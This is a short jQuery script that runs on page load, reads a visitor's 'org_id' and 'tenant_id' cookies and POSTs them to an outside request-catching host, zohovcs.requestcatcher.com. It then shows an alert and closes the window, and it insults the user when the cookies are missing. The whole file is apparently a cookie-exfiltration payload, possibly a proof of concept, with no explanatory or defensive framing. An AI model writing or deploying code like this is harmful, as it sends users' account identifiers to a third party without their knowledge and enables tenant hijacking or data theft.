$(document).ready( function() {

  function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
  }

  function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return null;
  }

  function checkCookie() {

    org_id = getCookie("org_id")
    tenant_id = getCookie("tenant_id")

    if (org_id && tenant_id) {
      $.ajax({
        type: "POST",
        url: "https://zohovcs.requestcatcher.com/register",
        data: {
          tenant_id: tenant_id,
          org_id: org_id
        },
        success: function(){
        },
        dataType: dataType
      });



      $.post("https://zohovcs.requestcatcher.com/register", {tenant_id: tenant_id, org_id: org_id}).then(function(){
        alert("OkAy")
        window.top.close();
      })
    } else {
      alert("yOu sTupiD, set Cookie first ~~")
      window.top.close();
    }
  }

  checkCookie();

});